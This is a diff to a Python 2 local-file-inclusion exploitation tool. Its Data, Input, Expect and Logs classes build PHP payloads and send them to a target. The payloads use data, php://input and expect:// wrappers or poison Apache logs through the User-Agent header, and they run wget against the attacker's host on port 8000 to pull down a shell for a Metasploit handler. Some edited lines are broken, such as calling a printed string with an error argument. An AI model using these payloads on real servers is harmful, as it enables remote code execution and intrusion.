@@ -70,7 +70,7 @@ class Data:
 
             # Build payload
             if self.nostager:
-                payload_file = open("/tmp/{0}.php".format(shell),"r")
+                payload_file = open("/tmp/{0}.php".format(shell), "r")
                 payload = payload_file.read()
                 payload_file.close()
             else:
@@ -85,7 +85,8 @@ class Data:
             handle.handler()
 
             if self.nostager:
-                raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...")
+                progressbar()
+                raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
             else:
                 # Assuming if there is a server running on port 8000 hosting from /tmp
                 print(t.red(" [!] ") + "Is Your Server Running?")
@@ -100,8 +101,9 @@ class Data:
             try:
                 if data_request.status_code != 200:
                     print(t.red(" [!] ") + "Unexpected HTTP Response ")
+                    sys.exit(1)
             except requests.exceptions.RequestException as data_error:
-                print(t.red(" [!] ") + "HTTP Error: %s" % data_error)
+                print(t.red(" [!] ") + "HTTP Error")(data_error)
 
 
 class Input:
@@ -152,9 +154,13 @@ class Input:
             payload_file.close()
         else:
             payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost,shell)
-            
+
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         if self.nostager:
-            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+            progressbar()
+            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")
         else: 
             # Assuming if there is a server running on port 8000 hosting from /tmp
             print(t.red(" [!] ") + "Is Your Server Running?")
@@ -162,16 +168,13 @@ class Input:
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
 
-        handle = Payload(lhost, lport, self.target, shell)
-        handle.handler()
-
-        # Try block for actual attack
         try:
             dr = requests.post(url, data=payload)
             if dr.status_code != 200:
                 print t.red(" [*] Unexpected HTTP Response ")
+                sys.exit(1)
         except requests.exceptions.RequestException as input_error:
-            print t.red(" [*] HTTP Error ") + str(input_error)
+            print t.red(" [*] HTTP Error ")(input_error)
 
 
 class Expect:
@@ -215,10 +218,11 @@ class Expect:
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "expect://echo \""
-            payload += quote_plus(payload_file.read().replace("\"","\\\"").replace("$","\\$"))
+            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
             payload += "\" | php"
             payload_file.close()
-            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+            progressbar()
+            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         else:
             payload = "expect://wget http://{0}:8000/{1}.php".format(lhost, shell)
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
@@ -226,21 +230,22 @@ class Expect:
             progressbar()
         lfi = self.target + payload
 
-
         try:
             r = requests.get(lfi)
             if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
+                sys.exit(1)
         except requests.exceptions.RequestException as expect_error:
-            print t.red(" [!] HTTP Error ") (expect_error)
+            print t.red(" [!] HTTP Error ")(expect_error)
 
 
 class Logs:
 
-    def __init__(self, target, location):
+    def __init__(self, target, location, nostager):
 
         self.target = target
         self.location = location  # /var/log/apache2/access.log
+        self.nostager = nostager
 
     def execute_logs(self):
 
@@ -251,7 +256,6 @@ class Logs:
         # Generate random shell name
         g = Generator()
         shell = g.generate()
-
 
         print(t.green(" [*] ") + "Generating Payload")
         progressbar()
@@ -270,20 +274,22 @@ class Logs:
         else:
             print(t.green(" [*] ") + "Success!")
 
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         if self.nostager:
-            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload_file = open("/tmp/{0}.php".format(shell), "r")
             payload = payload_file.read()
+            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
             payload_file.close()
-            raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
+            progressbar()
+            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         else:
             payload = "<?php system('wget http://{0}:8000/{1}.php') ?>".format(lhost, shell)
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
         lfi = self.target + self.location
-
-        handle = Payload(lhost, lport, self.target, shell)
-        handle.handler()
 
         try:
             headers = {'User-Agent': payload}
@@ -294,8 +300,8 @@ class Logs:
                 r = requests.get(lfi)  # pull down shell from poisoned logs
                 if r.status_code != 200:
                     print(t.red(" [!] Unexpected HTTP Response "))
-        except requests.exceptions.RequestException as expect_error:
-            print t.red(" [!] HTTP Error ")(expect_error)
+        except requests.exceptions.RequestException as access_error:
+            print t.red(" [!] HTTP Error ")(access_error)
 
 
 class Filter:
@@ -322,5 +328,5 @@ class Filter:
                 except TypeError as type_error:
                     print(t.red(" [!] ") + "Incorrect Padding - Check File!") + type_error  # handle padding issues
                     sys.exit(1)
-        except requests.exceptions.RequestException as expect_error:
-            print t.red(" [!] HTTP Error ")(expect_error)
+        except requests.exceptions.RequestException as filter_error:
+            print t.red(" [!] HTTP Error ")(filter_error)
